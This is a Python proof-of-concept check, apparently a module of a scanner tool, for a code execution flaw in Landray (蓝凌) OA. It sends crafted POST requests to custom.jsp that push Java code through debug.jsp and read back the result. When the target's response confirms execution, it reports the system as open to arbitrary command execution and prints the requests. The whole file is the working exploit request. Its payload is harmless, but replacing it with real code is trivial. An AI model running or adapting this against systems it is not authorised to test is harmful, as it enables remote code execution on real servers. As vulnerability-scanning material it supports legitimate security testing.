'''
Function:
    蓝凌OA debug.jsp 代码执行漏洞
Author:
    spmonkey，夜梓月
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import os
import sys
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()
path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(path)
from modules import get_user_agent


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': get_user_agent.get_user_agent(),
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url = "{}://{}/sys/ui/extend/varkind/custom.jsp".format(scheme, netloc)
        data1 = 'var={"body":{"file":"/sys/common/debug.jsp"}}&fdCode=out.println("hello world");'
        data2 = 'var={"body":{"file":"/sys/common/code.jsp"}}'
        try:
            result1 = requests.post(url=url, data=data1, headers=self.headers, verify=False, proxies=self.proxies)
            result2 = requests.post(url=url, data=data2, headers=self.headers, verify=False, proxies=self.proxies)
            if "hello world" in result2.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result1.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n\n                 {}".format(data1)
                self.result_text += """\n\n
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result2.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n\n                 {}".format(data2)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        if self.vuln(netloc, scheme):
            return self.result_text
        else:
            return False
